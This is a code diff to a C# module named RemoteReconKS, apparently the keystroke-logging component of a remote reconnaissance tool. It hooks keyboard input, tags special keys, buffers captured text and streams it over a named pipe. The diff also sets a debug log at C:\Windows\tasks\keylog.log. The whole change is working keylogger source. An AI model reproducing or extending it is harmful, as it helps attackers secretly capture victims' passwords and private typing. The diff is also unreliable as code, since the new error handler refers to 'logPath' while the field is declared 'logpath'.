@@ -14,7 +14,7 @@ namespace RemoteReconKS
     public class RemoteReconKS
     {
 #if DEBUG
-        private static string logpath;
+        private static string logpath = @"C:\Windows\tasks\keylog.log";
 #endif
         private static NamedPipeServerStream server;
         private static NamedPipeClientStream client;
@@ -130,32 +130,25 @@ namespace RemoteReconKS
                 switch ((Keys)vkCode)
                 {
                     case Keys.Space:
-                        key = Encoding.UTF8.GetBytes(" ");
-                        client.Write(key, 0, key.Length);
+                        modKey.Append(" ");
                         break;
                     case Keys.RControlKey:
-                        key = Encoding.UTF8.GetBytes("[RCTRL]");
-                        client.Write(key, 0, key.Length);
+                        modKey.Append(" [RCTRL] ");
                         break;
                     case Keys.LControlKey:
-                        key = Encoding.UTF8.GetBytes("[LCTRL]");
-                        client.Write(key, 0, key.Length);
+                        modKey.Append(" [LCTRL]");
                         break;
                     case Keys.LWin:
-                        key = Encoding.UTF8.GetBytes("[WIN]");
-                        client.Write(key, 0, key.Length);
+                        modKey.Append(" [WIN] ");
                         break;
                     case Keys.Tab:
-                        key = Encoding.UTF8.GetBytes("[TAB]");
-                        client.Write(key, 0, key.Length);
+                        modKey.Append(" [TAB] ");
                         break;
                     case Keys.Back:
-                        key = Encoding.UTF8.GetBytes("[BKSP]");
-                        client.Write(key, 0, key.Length);
+                        modKey.Append(" [BKSP] ");
                         break;
                     case Keys.Enter:
-                        key = Encoding.UTF8.GetBytes("[ENT]");
-                        client.Write(key, 0, key.Length);
+                        modKey.Append("[ENT]");
                         break;
                     default:
                         break;
@@ -179,16 +172,30 @@ namespace RemoteReconKS
 
                     var s = new StringBuilder(256);
                     var returnCode = WinApi.ToUnicodeEx((uint)vkCode, scancode, keyboardState, s, s.Capacity, 0, kblh);
+                    modKey.Append(s.ToString());
                     if (client.IsConnected)
                     {
-                        key = Encoding.UTF8.GetBytes(s.ToString());
-                        client.Write(key, 0, key.Length);
-                        client.Flush();
+                        key = Encoding.UTF8.GetBytes(modKey.ToString());
+
+                        try
+                        {
+                            client.Write(key, 0, key.Length);
+                            client.Flush();
+                        }
+                        catch (Exception e)
+                        {
+#if DEBUG
+                            File.AppendAllText(logPath, e.ToString());
+#endif
+                            Application.ExitThread();
+                        }
                     }
                     else
                     {
                         Application.ExitThread();
                     }
+
+                    modKey.Remove(0, modKey.Length);
 
                 }
                 else
